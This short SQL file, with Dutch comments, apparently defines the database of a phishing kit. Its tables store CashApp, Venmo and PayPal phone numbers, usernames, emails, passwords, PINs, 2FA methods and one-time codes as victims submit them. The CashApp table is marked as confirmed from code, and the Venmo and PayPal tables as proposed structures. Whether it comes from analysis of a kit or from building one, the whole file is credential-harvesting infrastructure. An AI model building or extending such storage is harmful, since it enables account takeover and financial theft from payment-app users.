
-- CASHAPP (bevestigd in code)
CREATE TABLE IF NOT EXISTS cshpp_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    phone_number VARCHAR(20) NOT NULL,
    verification_code VARCHAR(10),
    pin VARCHAR(10),
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- VENMO (voorgestelde structuur)
CREATE TABLE IF NOT EXISTS venmo_data (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    pin VARCHAR(10),
    code VARCHAR(10),
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- PAYPAL (voorgestelde structuur)
CREATE TABLE IF NOT EXISTS paypal_flow (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    twofa_method VARCHAR(100),
    code VARCHAR(20),
    submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
